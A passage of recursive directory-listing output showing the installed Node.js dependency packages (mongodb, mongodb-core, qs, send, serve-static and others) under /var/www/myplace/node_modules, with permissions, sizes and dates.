drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 5 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  17K Jun 22  2017 ipaddr.js

/var/www/myplace/node_modules/ipaddr.js/src:
total 24K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 5 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  16K Jun 22  2017 ipaddr.coffee

/var/www/myplace/node_modules/ipaddr.js/test:
total 28K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 5 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  20K Jun 22  2017 ipaddr.test.coffee

/var/www/myplace/node_modules/isarray:
total 40K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  470 Dec 10  2015 component.json
-rw-r--r--  1 root root  132 Dec 10  2015 index.js
-rw-r--r--  1 root root   55 Dec 10  2015 Makefile
-rw-r--r--  1 root root   13 Dec 10  2015 .npmignore
-rw-r--r--  1 root root 1.8K Sep  2  2017 package.json
-rw-r--r--  1 root root 1.9K Dec 10  2015 README.md
-rw-r--r--  1 root root  320 Dec 10  2015 test.js
-rw-r--r--  1 root root   48 Dec 10  2015 .travis.yml

/var/www/myplace/node_modules/media-typer:
total 32K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  461 Sep  8  2014 HISTORY.md
-rw-r--r--  1 root root 6.3K Sep  8  2014 index.js
-rw-r--r--  1 root root 1.1K Sep  8  2014 LICENSE
-rw-r--r--  1 root root 1.7K Sep  2  2017 package.json
-rw-r--r--  1 root root 2.4K Sep  8  2014 README.md

/var/www/myplace/node_modules/merge-descriptors:
total 28K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  363 Jan 17  2016 HISTORY.md
-rw-r--r--  1 root root 1.2K Jan 17  2016 index.js
-rw-r--r--  1 root root 1.2K Jan 17  2016 LICENSE
-rw-r--r--  1 root root 2.0K Sep  2  2017 package.json
-rw-r--r--  1 root root 1.2K May 22  2015 README.md

/var/www/myplace/node_modules/methods:
total 28K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  427 Jan 18  2016 HISTORY.md
-rw-r--r--  1 root root 1.1K Jan 18  2016 index.js
-rw-r--r--  1 root root 1.2K Jan 18  2016 LICENSE
-rw-r--r--  1 root root 2.0K Sep  2  2017 package.json
-rw-r--r--  1 root root 1.7K Jan 18  2016 README.md

/var/www/myplace/node_modules/mime:
total 64K
drwxr-xr-x  3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
drwxr-xr-x  2 root root 4.0K Sep  2  2017 build
-rwxr-xr-x  1 root root  149 Feb  5  2015 cli.js
-rw-r--r--  1 root root 1.1K May 10  2011 LICENSE
-rw-r--r--  1 root root 2.7K Feb  5  2015 mime.js
-rw-r--r--  1 root root    0 Feb  6  2015 .npmignore
-rw-r--r--  1 root root 1.7K Sep  2  2017 package.json
-rw-r--r--  1 root root 2.1K Feb  5  2015 README.md
-rw-r--r--  1 root root  29K Feb  7  2015 types.json

/var/www/myplace/node_modules/mime/build:
total 16K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  231 Feb  5  2015 build.js
-rw-r--r-- 1 root root 2.2K Feb  5  2015 test.js

/var/www/myplace/node_modules/mime-db:
total 180K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 146K Jul 11  2017 db.json
-rw-r--r--  1 root root 7.8K Jul 11  2017 HISTORY.md
-rw-r--r--  1 root root  136 Jan 15  2017 index.js
-rw-r--r--  1 root root 1.1K Jan 15  2017 LICENSE
-rw-r--r--  1 root root 2.5K Sep  2  2017 package.json
-rw-r--r--  1 root root 3.7K May 15  2017 README.md

/var/www/myplace/node_modules/mime-types:
total 32K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 4.3K Jul 25  2017 HISTORY.md
-rw-r--r--  1 root root 3.6K Jul 25  2017 index.js
-rw-r--r--  1 root root 1.2K Jan 15  2017 LICENSE
-rw-r--r--  1 root root 2.3K Sep  2  2017 package.json
-rw-r--r--  1 root root 3.1K Jul 25  2017 README.md

/var/www/myplace/node_modules/mongodb:
total 284K
drwxr-xr-x  3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 1.2K Aug  8  2017 boot_auth.js
-rw-r--r--  1 root root 2.2K Aug  8  2017 conf.json
-rw-r--r--  1 root root   46 Aug  8  2017 .coveralls.yml
-rw-r--r--  1 root root  198 Aug  8  2017 .eslintrc
-rw-r--r--  1 root root  93K Aug  8  2017 HISTORY.md
-rw-r--r--  1 root root 1.9K Aug  8  2017 index.js
-rw-r--r--  1 root root 5.2K Aug  8  2017 insert_bench.js
drwxr-xr-x  5 root root 4.0K Sep  2  2017 lib
-rw-r--r--  1 root root  12K Aug  8  2017 LICENSE
-rw-r--r--  1 root root  303 Aug  8  2017 Makefile
-rw-r--r--  1 root root 2.3K Sep  2  2017 package.json
-rw-r--r--  1 root root  14K Aug  8  2017 README.md
-rw-r--r--  1 root root 1.8K Aug  8  2017 THIRD-PARTY-NOTICES
-rw-r--r--  1 root root 105K Aug  8  2017 yarn.lock

/var/www/myplace/node_modules/mongodb/lib:
total 476K
drwxr-xr-x 5 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  19K Aug  8  2017 admin.js
-rw-r--r-- 1 root root  14K Aug  8  2017 aggregation_cursor.js
-rw-r--r-- 1 root root  20K Aug  8  2017 apm.js
-rw-r--r-- 1 root root 4.3K Aug  8  2017 authenticate.js
drwxr-xr-x 2 root root 4.0K Sep  2  2017 bulk
-rw-r--r-- 1 root root 129K Aug  8  2017 collection.js
-rw-r--r-- 1 root root  11K Aug  8  2017 command_cursor.js
-rw-r--r-- 1 root root  41K Aug  8  2017 cursor.js
-rw-r--r-- 1 root root  72K Aug  8  2017 db.js
drwxr-xr-x 2 root root 4.0K Sep  2  2017 gridfs
drwxr-xr-x 2 root root 4.0K Sep  2  2017 gridfs-stream
-rw-r--r-- 1 root root 1.6K Aug  8  2017 metadata.js
-rw-r--r-- 1 root root  25K Aug  8  2017 mongo_client.js
-rw-r--r-- 1 root root  17K Aug  8  2017 mongos.js
-rw-r--r-- 1 root root 4.0K Aug  8  2017 read_preference.js
-rw-r--r-- 1 root root  19K Aug  8  2017 replset.js
-rw-r--r-- 1 root root  17K Aug  8  2017 server.js
-rw-r--r-- 1 root root 6.5K Aug  8  2017 topology_base.js
-rw-r--r-- 1 root root  14K Aug  8  2017 url_parser.js
-rw-r--r-- 1 root root  10K Aug  8  2017 utils.js

/var/www/myplace/node_modules/mongodb/lib/bulk:
total 60K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 5 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  12K Aug  8  2017 common.js
-rw-r--r-- 1 root root  17K Aug  8  2017 ordered.js
-rw-r--r-- 1 root root  17K Aug  8  2017 unordered.js

/var/www/myplace/node_modules/mongodb/lib/gridfs:
total 84K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 5 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 7.0K Aug  8  2017 chunk.js
-rw-r--r-- 1 root root  67K Aug  8  2017 grid_store.js

/var/www/myplace/node_modules/mongodb/lib/gridfs-stream:
total 48K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 5 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  11K Aug  8  2017 download.js
-rw-r--r-- 1 root root  12K Aug  8  2017 index.js
-rw-r--r-- 1 root root  13K Aug  8  2017 upload.js

/var/www/myplace/node_modules/mongodb-core:
total 108K
drwxr-xr-x  3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 1.6K Aug  7  2017 conf.json
-rw-r--r--  1 root root   46 Aug  7  2017 .coveralls.yml
-rw-r--r--  1 root root  198 Aug  7  2017 .eslintrc
-rw-r--r--  1 root root  32K Aug  8  2017 HISTORY.md
-rw-r--r--  1 root root 1.1K Aug  8  2017 index.js
drwxr-xr-x  7 root root 4.0K Sep  2  2017 lib
-rw-r--r--  1 root root  12K Aug  6  2017 LICENSE
-rw-r--r--  1 root root  303 Aug  6  2017 Makefile
-rw-r--r--  1 root root 2.1K Sep  2  2017 package.json
-rw-r--r--  1 root root 8.3K Aug  7  2017 README.md
-rw-r--r--  1 root root 2.1K Aug  7  2017 test1.js
-rw-r--r--  1 root root  373 Aug  6  2017 TESTING.md
-rw-r--r--  1 root root 1.9K Aug  7  2017 test.js
-rw-r--r--  1 root root 1.8K Aug  7  2017 THIRD-PARTY-NOTICES

/var/www/myplace/node_modules/mongodb-core/lib:
total 60K
drwxr-xr-x 7 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
drwxr-xr-x 2 root root 4.0K Sep  2  2017 auth
drwxr-xr-x 2 root root 4.0K Sep  2  2017 connection
-rw-r--r-- 1 root root  23K Aug  8  2017 cursor.js
-rw-r--r-- 1 root root  993 Aug  8  2017 error.js
drwxr-xr-x 2 root root 4.0K Sep  2  2017 tools
drwxr-xr-x 2 root root 4.0K Sep  2  2017 topologies
-rw-r--r-- 1 root root  951 Aug  7  2017 utils.js
drwxr-xr-x 2 root root 4.0K Sep  2  2017 wireprotocol

/var/www/myplace/node_modules/mongodb-core/lib/auth:
total 64K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 7 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 8.1K Aug  8  2017 gssapi.js
-rw-r--r-- 1 root root 5.4K Aug  8  2017 mongocr.js
-rw-r--r-- 1 root root 4.8K Aug  8  2017 plain.js
-rw-r--r-- 1 root root 9.6K Aug  8  2017 scram.js
-rw-r--r-- 1 root root 7.8K Aug  8  2017 sspi.js
-rw-r--r-- 1 root root 4.6K Aug  8  2017 x509.js

/var/www/myplace/node_modules/mongodb-core/lib/connection:
total 112K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 7 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  749 Aug  7  2017 command_result.js
-rw-r--r-- 1 root root  18K Aug  8  2017 commands.js
-rw-r--r-- 1 root root  22K Aug  8  2017 connection.js
-rw-r--r-- 1 root root 6.1K Aug  8  2017 logger.js
-rw-r--r-- 1 root root  44K Aug  8  2017 pool.js
-rw-r--r-- 1 root root 2.2K Aug  8  2017 utils.js

/var/www/myplace/node_modules/mongodb-core/lib/tools:
total 12K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 7 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 1.6K Aug  6  2017 smoke_plugin.js

/var/www/myplace/node_modules/mongodb-core/lib/topologies:
total 184K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 7 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  42K Aug  8  2017 mongos.js
-rw-r--r-- 1 root root 3.5K Aug  7  2017 read_preference.js
-rw-r--r-- 1 root root  49K Aug  8  2017 replset.js
-rw-r--r-- 1 root root  30K Aug  8  2017 replset_state.js
-rw-r--r-- 1 root root  31K Aug  8  2017 server.js
-rw-r--r-- 1 root root 8.7K Aug  8  2017 shared.js

/var/www/myplace/node_modules/mongodb-core/lib/wireprotocol:
total 72K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 7 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  19K Aug  8  2017 2_4_support.js
-rw-r--r-- 1 root root  11K Aug  8  2017 2_6_support.js
-rw-r--r-- 1 root root  16K Aug  8  2017 3_2_support.js
-rw-r--r-- 1 root root  11K Aug  8  2017 commands.js
-rw-r--r-- 1 root root  767 Aug  8  2017 shared.js

/var/www/myplace/node_modules/ms:
total 24K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 2.7K May 16  2017 index.js
-rw-r--r--  1 root root 1.1K May 16  2017 license.md
-rw-r--r--  1 root root 1.7K Sep  2  2017 package.json
-rw-r--r--  1 root root 1.7K May 16  2017 readme.md

/var/www/myplace/node_modules/negotiator:
total 36K
drwxr-xr-x  3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 2.3K May  3  2016 HISTORY.md
-rw-r--r--  1 root root 3.3K May  3  2016 index.js
drwxr-xr-x  2 root root 4.0K Sep  2  2017 lib
-rw-r--r--  1 root root 1.2K Apr 28  2016 LICENSE
-rw-r--r--  1 root root 2.1K Sep  2  2017 package.json
-rw-r--r--  1 root root 4.7K May  3  2016 README.md

/var/www/myplace/node_modules/negotiator/lib:
total 28K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 3.1K May  3  2016 charset.js
-rw-r--r-- 1 root root 3.5K May  3  2016 encoding.js
-rw-r--r-- 1 root root 3.4K May  3  2016 language.js
-rw-r--r-- 1 root root 5.3K May  3  2016 mediaType.js

/var/www/myplace/node_modules/on-finished:
total 32K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 1.7K May 27  2015 HISTORY.md
-rw-r--r--  1 root root 3.6K May 26  2015 index.js
-rw-r--r--  1 root root 1.2K Aug 16  2014 LICENSE
-rw-r--r--  1 root root 2.0K Sep  2  2017 package.json
-rw-r--r--  1 root root 4.8K May 26  2015 README.md

/var/www/myplace/node_modules/on-headers:
total 28K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  296 Sep 30  2015 HISTORY.md
-rw-r--r--  1 root root 2.1K Sep 30  2015 index.js
-rw-r--r--  1 root root 1.1K May 14  2014 LICENSE
-rw-r--r--  1 root root 1.9K Sep  2  2017 package.json
-rw-r--r--  1 root root 1.9K Feb 15  2015 README.md

/var/www/myplace/node_modules/parseurl:
total 28K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  832 Jan 17  2016 HISTORY.md
-rw-r--r--  1 root root 2.4K Jan 17  2016 index.js
-rw-r--r--  1 root root 1.2K Aug 10  2014 LICENSE
-rw-r--r--  1 root root 2.0K Sep  2  2017 package.json
-rw-r--r--  1 root root 3.4K Jan 17  2016 README.md

/var/www/myplace/node_modules/path-to-regexp:
total 28K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  694 Jul 28  2015 History.md
-rw-r--r--  1 root root 3.3K Jul 28  2015 index.js
-rw-r--r--  1 root root 1.1K Jul 28  2015 LICENSE
-rw-r--r--  1 root root 1.5K Sep  2  2017 package.json
-rw-r--r--  1 root root 1.1K Jul 28  2015 Readme.md

/var/www/myplace/node_modules/process-nextick-args:
total 32K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 1.1K May  4  2016 index.js
-rw-r--r--  1 root root 1.1K Sep  9  2015 license.md
-rw-r--r--  1 root root 1.4K Sep  2  2017 package.json
-rw-r--r--  1 root root  451 Sep  9  2015 readme.md
-rw-r--r--  1 root root  526 Sep  9  2015 test.js
-rw-r--r--  1 root root  112 Feb 26  2016 .travis.yml

/var/www/myplace/node_modules/proxy-addr:
total 36K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 2.2K Jul 26  2017 HISTORY.md
-rw-r--r--  1 root root 5.9K Jul 26  2017 index.js
-rw-r--r--  1 root root 1.1K Jan 15  2017 LICENSE
-rw-r--r--  1 root root 2.0K Sep  2  2017 package.json
-rw-r--r--  1 root root 4.2K Mar 24  2017 README.md

/var/www/myplace/node_modules/qs:
total 72K
drwxr-xr-x  5 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  11K Mar  6  2017 CHANGELOG.md
drwxr-xr-x  2 root root 4.0K Sep  2  2017 dist
-rw-r--r--  1 root root    5 Dec 23  2015 .eslintignore
-rw-r--r--  1 root root  532 Mar  6  2017 .eslintrc
-rw-r--r--  1 root root 4.1K Mar  6  2017 .jscs.json
drwxr-xr-x  2 root root 4.0K Sep  2  2017 lib
-rw-r--r--  1 root root 1.7K Dec 23  2015 LICENSE
-rw-r--r--  1 root root 2.1K Sep  2  2017 package.json
-rw-r--r--  1 root root  13K Feb 22  2017 README.md
drwxr-xr-x  2 root root 4.0K Sep  2  2017 test

/var/www/myplace/node_modules/qs/dist:
total 28K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 5 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  18K Mar  6  2017 qs.js

/var/www/myplace/node_modules/qs/lib:
total 40K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 5 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  387 Feb 16  2017 formats.js
-rw-r--r-- 1 root root  211 Mar  6  2017 index.js
-rw-r--r-- 1 root root 5.4K Mar  6  2017 parse.js
-rw-r--r-- 1 root root 6.0K Mar  6  2017 stringify.js
-rw-r--r-- 1 root root 4.8K Mar  6  2017 utils.js

/var/www/myplace/node_modules/qs/test:
total 64K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 5 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  229 Mar  6  2017 .eslintrc
-rw-r--r-- 1 root root   81 Feb 16  2017 index.js
-rw-r--r-- 1 root root  21K Mar  6  2017 parse.js
-rw-r--r-- 1 root root  20K Mar  6  2017 stringify.js
-rw-r--r-- 1 root root 1.1K Mar  6  2017 utils.js

/var/www/myplace/node_modules/random-bytes:
total 28K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root   59 Jan 17  2016 HISTORY.md
-rw-r--r--  1 root root 2.0K Jan 17  2016 index.js
-rw-r--r--  1 root root 1.1K Jan 17  2016 LICENSE
-rw-r--r--  1 root root 2.0K Sep  2  2017 package.json
-rw-r--r--  1 root root 2.1K Jan 17  2016 README.md

/var/www/myplace/node_modules/range-parser:
total 28K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  832 Jun  1  2016 HISTORY.md
-rw-r--r--  1 root root 2.8K Jun  1  2016 index.js
-rw-r--r--  1 root root 1.2K Jun  1  2016 LICENSE
-rw-r--r--  1 root root 2.2K Sep  2  2017 package.json
-rw-r--r--  1 root root 2.0K Jun  1  2016 README.md

/var/www/myplace/node_modules/raw-body:
total 40K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 4.1K Jan  3  2017 HISTORY.md
-rw-r--r--  1 root root 6.7K Jan  3  2017 index.js
-rw-r--r--  1 root root 1.2K Jan  3  2017 LICENSE
-rw-r--r--  1 root root 2.4K Sep  2  2017 package.json
-rw-r--r--  1 root root 4.4K Jan  3  2017 README.md

/var/www/myplace/node_modules/readable-stream:
total 80K
drwxr-xr-x  4 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 1.5K Mar 10  2017 CONTRIBUTING.md
drwxr-xr-x  3 root root 4.0K Sep  2  2017 doc
-rw-r--r--  1 root root   53 Apr  7  2017 duplex-browser.js
-rw-r--r--  1 root root   46 Apr  7  2017 duplex.js
-rw-r--r--  1 root root 5.5K Mar 10  2017 GOVERNANCE.md
drwxr-xr-x  3 root root 4.0K Sep  2  2017 lib
-rw-r--r--  1 root root 2.3K Mar 10  2017 LICENSE
-rw-r--r--  1 root root   74 Dec 19  2016 .npmignore
-rw-r--r--  1 root root 2.4K Sep  2  2017 package.json
-rw-r--r--  1 root root   51 Apr  7  2017 passthrough.js
-rw-r--r--  1 root root  351 Apr  7  2017 readable-browser.js
-rw-r--r--  1 root root  771 Apr  7  2017 readable.js
-rw-r--r--  1 root root 2.9K Mar 16  2017 README.md
-rw-r--r--  1 root root   49 Apr  7  2017 transform.js
-rw-r--r--  1 root root 1.5K Mar 29  2017 .travis.yml
-rw-r--r--  1 root root   55 Apr  7  2017 writable-browser.js
-rw-r--r--  1 root root  219 Apr  7  2017 writable.js

/var/www/myplace/node_modules/readable-stream/doc:
total 12K
drwxr-xr-x 3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 4 root root 4.0K Sep  2  2017 ..
drwxr-xr-x 2 root root 4.0K Sep  2  2017 wg-meetings

/var/www/myplace/node_modules/readable-stream/doc/wg-meetings:
total 12K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 2.3K Sep 29  2016 2015-01-30.md

/var/www/myplace/node_modules/readable-stream/lib:
total 72K
drwxr-xr-x 3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 4 root root 4.0K Sep  2  2017 ..
drwxr-xr-x 3 root root 4.0K Sep  2  2017 internal
-rw-r--r-- 1 root root 1.9K Mar 16  2017 _stream_duplex.js
-rw-r--r-- 1 root root  604 Mar 16  2017 _stream_passthrough.js
-rw-r--r-- 1 root root  28K Mar 16  2017 _stream_readable.js
-rw-r--r-- 1 root root 6.3K Mar 16  2017 _stream_transform.js
-rw-r--r-- 1 root root  16K Mar 16  2017 _stream_writable.js

/var/www/myplace/node_modules/readable-stream/lib/internal:
total 12K
drwxr-xr-x 3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
drwxr-xr-x 2 root root 4.0K Sep  2  2017 streams

/var/www/myplace/node_modules/readable-stream/lib/internal/streams:
total 12K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 1.5K Mar 16  2017 BufferList.js

/var/www/myplace/node_modules/require_optional:
total 48K
drwxr-xr-x  3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  356 Jun 14  2017 HISTORY.md
-rw-r--r--  1 root root 3.9K Jun 14  2017 index.js
-rw-r--r--  1 root root  12K Feb  3  2016 LICENSE
-rw-r--r--  1 root root  529 Feb  3  2016 .npmignore
-rw-r--r--  1 root root 1.9K Sep  2  2017 package.json
-rw-r--r--  1 root root  165 Feb  3  2016 README.md
drwxr-xr-x  3 root root 4.0K Sep  2  2017 test
-rw-r--r--  1 root root   93 Jun 13  2017 .travis.yml

/var/www/myplace/node_modules/require_optional/test:
total 16K
drwxr-xr-x 3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
drwxr-xr-x 2 root root 4.0K Sep  2  2017 nestedTest
-rw-r--r-- 1 root root 2.1K Jun 14  2017 require_optional_tests.js

/var/www/myplace/node_modules/require_optional/test/nestedTest:
total 16K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  179 Jun 14  2017 index.js
-rw-r--r-- 1 root root  332 Jun 14  2017 package.json

/var/www/myplace/node_modules/resolve-from:
total 24K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  532 Nov 29  2015 index.js
-rw-r--r--  1 root root 1.1K Apr  6  2014 license
-rw-r--r--  1 root root 1.6K Sep  2  2017 package.json
-rw-r--r--  1 root root 1.1K Nov 29  2015 readme.md

/var/www/myplace/node_modules/safe-buffer:
total 48K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 1.5K Jun 21  2017 index.js
-rw-r--r--  1 root root 1.1K Jan 13  2016 LICENSE
-rw-r--r--  1 root root 1.6K Sep  2  2017 package.json
-rw-r--r--  1 root root  20K Mar 21  2017 README.md
-rw-r--r--  1 root root 2.8K Jun  2  2017 test.js
-rw-r--r--  1 root root   76 May 30  2016 .travis.yml

/var/www/myplace/node_modules/semver:
total 76K
drwxr-xr-x  3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
drwxr-xr-x  2 root root 4.0K Sep  2  2017 bin
-rw-r--r--  1 root root  765 May  5  2015 LICENSE
-rw-r--r--  1 root root 1.4K Sep  2  2017 package.json
-rw-r--r--  1 root root  629 Feb 13  2016 range.bnf
-rw-r--r--  1 root root  14K Jul 24  2017 README.md
-rw-r--r--  1 root root  35K Jul 24  2017 semver.js

/var/www/myplace/node_modules/semver/bin:
total 12K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rwxr-xr-x 1 root root 4.0K Feb  8  2017 semver

/var/www/myplace/node_modules/send:
total 68K
drwxr-xr-x  3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  11K Aug  6  2017 HISTORY.md
-rw-r--r--  1 root root  22K May 17  2017 index.js
-rw-r--r--  1 root root 1.2K Jan 21  2017 LICENSE
drwxr-xr-x  3 root root 4.0K Sep  2  2017 node_modules
-rw-r--r--  1 root root 2.7K Sep  2  2017 package.json
-rw-r--r--  1 root root 8.5K Feb 25  2017 README.md

/var/www/myplace/node_modules/send/node_modules:
total 12K
drwxr-xr-x 3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
drwxr-xr-x 3 root root 4.0K Sep  2  2017 debug

/var/www/myplace/node_modules/send/node_modules/debug:
total 84K
drwxr-xr-x 3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  12K May 18  2017 CHANGELOG.md
-rw-r--r-- 1 root root  321 May 18  2017 component.json
-rw-r--r-- 1 root root   46 Dec 25  2016 .coveralls.yml
-rw-r--r-- 1 root root  180 Dec 25  2016 .eslintrc
-rw-r--r-- 1 root root 1.7K Dec 21  2016 karma.conf.js
-rw-r--r-- 1 root root 1.1K Oct 22  2016 LICENSE
-rw-r--r-- 1 root root 1.1K Feb 10  2017 Makefile
-rw-r--r-- 1 root root   40 Dec 25  2016 node.js
-rw-r--r-- 1 root root   72 May 18  2017 .npmignore
-rw-r--r-- 1 root root 2.1K Sep  2  2017 package.json
-rw-r--r-- 1 root root  18K May 18  2017 README.md
drwxr-xr-x 2 root root 4.0K Sep  2  2017 src
-rw-r--r-- 1 root root  140 Dec 25  2016 .travis.yml

/var/www/myplace/node_modules/send/node_modules/debug/src:
total 36K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 4.7K May 18  2017 browser.js
-rw-r--r-- 1 root root 4.3K May 18  2017 debug.js
-rw-r--r-- 1 root root  263 Dec 21  2016 index.js
-rw-r--r-- 1 root root 5.9K May 18  2017 node.js

/var/www/myplace/node_modules/serve-static:
total 44K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 8.4K Aug  6  2017 HISTORY.md
-rw-r--r--  1 root root 4.5K Feb 25  2017 index.js
-rw-r--r--  1 root root 1.2K Feb 25  2017 LICENSE
-rw-r--r--  1 root root 2.2K Sep  2  2017 package.json
-rw-r--r--  1 root root 7.4K Feb 25  2017 README.md

/var/www/myplace/node_modules/setprototypeof:
total 24K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  334 Feb 20  2017 index.js
-rw-r--r--  1 root root  727 Feb  6  2016 LICENSE
-rw-r--r--  1 root root 1.4K Sep  2  2017 package.json
-rw-r--r--  1 root root  401 Feb  6  2016 README.md

/var/www/myplace/node_modules/statuses:
total 32K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 1.8K Nov 12  2016 codes.json
